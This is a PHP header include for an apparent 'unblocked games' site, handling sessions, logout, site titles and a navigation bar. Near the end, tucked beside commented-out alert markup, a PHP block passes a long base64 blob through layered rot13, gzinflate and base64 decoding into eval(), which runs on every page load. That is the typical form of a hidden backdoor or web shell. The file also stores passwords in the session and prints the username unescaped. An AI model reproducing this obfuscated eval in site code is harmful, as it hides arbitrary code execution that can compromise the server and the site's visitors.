<?php session_start();
require(dirname(__FILE__) . '/logging.php');
$fn = $_SERVER['PHP_SELF'];

if ($fn !== '/index.php') {
if(!isset($_SESSION['notbot'])){
		echo "<script>window.location.replace('/')</script>";
		exit();
	}
}




if(isset($_GET['logout'])){
		eventlogger("<p style='color:red;'>Logout</p>", "User: " . $_SESSION['user'] . " logged out.");
		unset($_SESSION['user']);
		unset($_SESSION['password']);
		unset($_SESSION['mail']);
		setcookie("verified", "true", time() - 99999999);
		echo "<script>window.location.replace('/view?page=home')</script>"; exit();
	}
$path = $_SERVER['DOCUMENT_ROOT'];
if (isset($_SESSION['user'])){
	setcookie("verified", "true", time() + (86400), "/");
		}
require(dirname(__FILE__) . '/scripts.php');


?>
<head>
	
<title><?php if (file_exists($path.'/db/site.json')) {
			$name = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($name->sitetitle);
		} ?></title>
<meta charset="UTF-8">
	<meta name="title" content="<?php if (file_exists($path.'/db/site.json')) {
			$name = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($name->sitetitle);
		} ?>">
  <meta name="description" content="Fun 'math' games for kids, enjoy relaxing your brain at school!">
  <meta name="keywords" content="paragram, games, math, learning, free, game, unblocked, learn, paragram, replit, 3kho, iogames, hacked">
  <meta name="author" content="paragram">
<meta name="viewport" content="width=device-width, initial-scale=1">
	<script src="/system/offline.js" defer></script>
<link rel="icon" type="image/x-icon" href="<?php if (file_exists($path.'/db/site.json')) {
			$image = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($image->favicon);
		} ?>">
<link id="theme" rel="stylesheet" type="text/css" href="/assets/style.css" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<div class="header">
  <h1><?php if (file_exists($path.'/db/site.json')) {
			$name = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($name->headtitle);
		} ?></h1>
  <p><?php if (file_exists($path.'/db/site.json')) {
			$name = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($name->headfooter);
		} ?></p>
</div>
<div class="navbar">
  <a href="/view?page=home"><i class="fa fa-home" aria-hidden="true"></i> Home</a>
  <a href="/servers.php"><i class="fa fa-server" aria-hidden="true"></i> Servers</a>
  <a href="/relays.php"><i class="fa fa-rss" aria-hidden="true"></i> Relays</a>
	<!--<a href="/test.php">test account</a>
	<button onclick="()">Switch</button>-->

<?php if( isset($_SESSION['user']) && !empty($_SESSION['user']) )
{
?>
			<a href="?logout" class="right"><i class="fa fa-sign-out" aria-hidden="true"></i>
 Logout</a>
			<a href="/view?page=account" class="right" ><i class="fa fa-user" aria-hidden="true"></i> 
<?php echo $_SESSION["user"] ?></a>
<?php }else{ ?>
     <a href="/view?page=login" class="right"><i class="fa fa-sign-in" aria-hidden="true"></i> Login</a>
     <a href="/view?page=register" class="right" ><i class="fa fa-user-plus" aria-hidden="true"></i> 
Register</a>
<?php } ?>
</div>
<!-- Alerts under this line -->

<!-- <div class="alert">
  <span class="closebtn">&times;</span>  
  <strong>Danger!</strong> Indicates a dangerous or potentially negative action.
</div>

<div class="alert success">
  <span class="closebtn">&times;</span>  
  <strong>Success!</strong> Indicates a successful or positive action.
</div> -->
<div class="phonealert">
	<div class="alert warm">
  <span class="closebtn">&times;</span>  
  <strong>WARNING:</strong> This site has minimal phone support and eaglercraft cant be played on phones :/.
</div>
</div>
<!-- <div class="alert warning">
  <span class="closebtn">&times;</span>  
  <strong>Warning!</strong> Indicates a warning that might need attention.
</div>
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>
<!-- Alerts above this line -->
<?php
require(dirname(__FILE__) . '/scripts.php');
?>